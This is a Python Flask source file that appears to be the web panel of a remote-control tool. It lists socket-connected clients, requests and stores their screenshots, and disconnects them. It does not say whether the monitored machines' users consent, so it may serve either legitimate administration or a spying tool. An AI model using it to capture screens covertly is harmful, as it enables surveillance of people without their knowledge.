from flask import Flask, render_template, send_from_directory, jsonify
import socket
from state import client_info, clients

app = Flask(__name__)


@app.route("/")
def index():
    return render_template("index.html")


@app.route("/api/clients")
def api_clients():
    return jsonify(client_info)


@app.route("/screenshot/<client_id>")
def screenshot(client_id):
    conn = clients.get(client_id)
    if not conn:
        return "Client offline", 404
    try:
        conn.sendall(b"GET_SCREENSHOT")
        size = int.from_bytes(conn.recv(4), 'little')
        data = b""
        while len(data) < size:
            chunk = conn.recv(size - len(data))
            if not chunk:
                break
            data += chunk
        path = f"static/screenshots/{client_id}.bmp"
        with open(path, "wb") as f:
            f.write(data)
        return send_from_directory("static/screenshots", f"{client_id}.bmp")
    except Exception as e:
        return f"Error: {e}"


@app.route("/disconnect/<client_id>")
def disconnect(client_id):
    conn = clients.get(client_id)
    if conn:
        try:
            conn.shutdown(socket.SHUT_RDWR)
            conn.close()
        except Exception:
            pass
        clients.pop(client_id, None)
        client_info.pop(client_id, None)
    return "", 204
